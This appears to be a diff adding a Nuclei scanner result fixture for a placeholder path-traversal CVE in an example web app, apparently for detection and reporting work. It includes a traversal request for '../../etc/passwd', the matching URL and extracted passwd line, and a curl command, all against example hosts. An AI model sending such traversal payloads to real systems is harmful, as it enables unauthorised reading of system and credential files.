@@ -1,0 +1,45 @@
+[
+  {
+    "template": "http/cves/2024/CVE-2024-0001.yaml",
+    "template-path": "/home/scanner/nuclei-templates/http/cves/2024/CVE-2024-0001.yaml",
+    "template-id": "CVE-2024-0001",
+    "template-url": "https://cloud.projectdiscovery.io/public/CVE-2024-0001",
+    "info": {
+      "name": "Example App - Path Traversal",
+      "author": ["example-author"],
+      "tags": ["cve", "lfi"],
+      "description": "Example App allows reading files outside the web root.",
+      "impact": "Arbitrary file read.",
+      "reference": ["https://www.example.com/advisory/0001"],
+      "severity": "high",
+      "metadata": {"max-request": 1, "vendor": "example"},
+      "classification": {
+        "cve-id": ["cve-2024-0001"],
+        "cwe-id": ["cwe-22"],
+        "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss-score": 7.5,
+        "epss-score": 0.42,
+        "epss-percentile": 0.97,
+        "cpe": "cpe:2.3:a:example:app:*:*:*:*:*:*:*:*"
+      },
+      "remediation": "Upgrade Example App to 2.0."
+    },
+    "type": "http",
+    "host": "app.example.com",
+    "port": "8443",
+    "scheme": "https",
+    "url": "https://app.example.com:8443",
+    "path": "/download",
+    "matched-at": "https://user:secret@app.example.com:8443/download?file=../../etc/passwd",
+    "extracted-results": ["root:x:0:0:root:/root:/bin/bash"],
+    "request": "GET /download?file=../../etc/passwd HTTP/1.1\r\nHost: app.example.com\r\nCookie: session=abc\r\n\r\n",
+    "response": "HTTP/1.1 200 OK\r\n\r\nroot:x:0:0",
+    "meta": {"file": "../../etc/passwd"},
+    "ip": "203.0.113.50",
+    "timestamp": "2026-10-05T10:00:00.000000000Z",
+    "curl-command": "curl -X GET -H 'Cookie: session=abc' https://app.example.com:8443/download",
+    "matcher-status": true,
+    "matcher-name": "passwd",
+    "extractor-name": "users"
+  }
+]
